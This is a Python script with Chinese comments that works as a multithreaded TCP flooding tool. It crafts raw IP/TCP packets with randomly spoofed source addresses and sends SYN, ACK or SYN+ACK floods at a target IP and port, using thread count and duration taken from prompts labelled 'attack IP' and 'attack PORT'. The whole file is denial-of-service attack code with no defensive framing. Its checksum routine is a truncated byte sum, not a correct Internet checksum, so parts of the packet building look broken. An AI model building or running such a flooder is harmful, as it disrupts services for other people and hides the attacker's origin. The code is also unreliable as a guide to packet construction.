#!/usr/bin/python

import socket
import struct
import random
import threading
import time


class myThread(threading.Thread):
    def __init__(self, dstip, dstport, mode, time):
        threading.Thread.__init__(self)
        self.dstip = dstip
        self.dstport = dstport
        self.mode = mode
        self.times = time

    def run(self):
        attack(self.dstip, self.dstport, self.mode, self.times)


def uchar_checksum(data, byteorder='big'):
    '''
    char_checksum 按字节计算校验和。每个字节被翻译为无符号整数
    @param data: 字节串
    @param byteorder: 大/小端
    '''
    length = len(data)
    checksum = 0
    for i in range(0, length):
        checksum += int.from_bytes(data[i:i + 1], byteorder, signed=False)
        checksum &= 0xFF  # 强制截断
    return checksum


def IP(source, destination, udplen):
    version = 4
    ihl = 5
    tos = 0
    tl = 20 + udplen
    ip_id = random.randint(1, 65535)
    flags = 0
    offset = 0
    ttl = 128
    protocol = socket.IPPROTO_TCP
    check = 0
    source = socket.inet_aton(source)
    destination = socket.inet_aton(destination)

    ver_ihl = (version << 4) + ihl
    flags_offset = (flags << 13) + offset
    ip_header = struct.pack("!BBHHHBBH4s4s",
                            ver_ihl,
                            tos,
                            tl,
                            ip_id,
                            flags_offset,
                            ttl,
                            protocol,
                            check,
                            source,
                            destination)
    check = uchar_checksum(ip_header)
    # print(socket.htons(check))
    ip_header = struct.pack("!BBHHHBBH4s4s",
                            ver_ihl,
                            tos,
                            tl,
                            ip_id,
                            flags_offset,
                            ttl,
                            protocol,
                            socket.htons(check),
                            source,
                            destination)
    return ip_header


def TCP(src_ip, dst_ip, protocol, dp, ack_judge):
    source = socket.inet_aton(src_ip)
    destination = socket.inet_aton(dst_ip)
    src_port = random.randint(1, 65535)
    dst_port = dp
    syn_num = random.randint(1, 4000000000)
    if ack_judge == 2:
        ack_num = 0
    else:
        # 在此处判断是否是ack方式
        ack_num = random.randint(1, 4000000000)
    hlen = 5
    zero = 0
    flag = ack_judge
    window = 8192
    check = 0
    point = 0
    tcp_len = hlen
    h_f = (hlen << 12) + flag
    TCP_head = struct.pack("!4s4sHHHHIIHHHH", source, destination, protocol, tcp_len, src_port, dst_port, syn_num, ack_num,
                           h_f, window, check, point)
    check = uchar_checksum(TCP_head)
    TCP_head = struct.pack("!HHIIHHHH", src_port, dst_port, syn_num, ack_num, h_f, window, check, point)
    return TCP_head


def makepacket(dstip, dstport, fg):
    srcip = str(random.choice(ip_first)) + '.' + str(random.randint(1, 255)) + '.' + str(
        random.randint(1, 255)) + '.' + str(random.randint(1, 255))
    protocol = 6
    ippacket = IP(srcip, dstip, 5) + TCP(srcip, dstip, protocol, dstport, fg)
    return ippacket


def attack(dstip, dstport, mode, times):
    if mode == '1':  # syn
        fg = 2
        st = time.time()
        while 1:
            end = time.time()
            if end - st < times:
                data = makepacket(dstip, dstport, fg)
                # print(data)
                addr = (dstip, dstport)
                # s.connect_ex((dstip, dstport))
                s.sendto(data, addr)
            else:
                exit()
    elif mode == '2':  # ack
        fg = 18
        st = time.time()
        while 1:
            end = time.time()
            if end - st < times:
                data = makepacket(dstip, dstport, fg)
                s.sendto(data, (dstip, dstport))
            else:
                exit()
    elif mode == '3':  # syn&ack
        st = time.time()
        while 1:
            end = time.time()
            if end - st < times:
                data = makepacket(dstip, dstport, 2)
                s.sendto(data, (dstip, dstport))
                data = makepacket(dstip, dstport, 18)
                s.sendto(data, (dstip, dstport))
            else:
                exit()
    else:
        print('输入错误')


ip_first = []
for i in range(1, 10):
    ip_first.append(i)

for i in range(11, 172):
    ip_first.append(i)

for i in range(173, 192):
    ip_first.append(i)

for i in range(193, 224):
    ip_first.append(i)

# s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # udp
# s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)#错误的
# s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
# s = socket.socket(socket.AF_INET, socket.SOCK_RAW)
# s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
# todo 套接字的含义

if __name__ == '__main__':
    dstip = input('attack IP:')
    dstport = int(input('attack PORT:'))
    mode = input('mode:(syn or ack or syn&ack)')
    threads = int(input("线程数threads："))
    times = int(input("攻击时间："))
    threads_name = []
    for i in range(threads):
        threads_name.append('teread' + str(i))

    for i in range(threads):
        threads_name[i] = myThread(dstip, dstport, mode, times)

    for i in range(threads):
        threads_name[i].start()
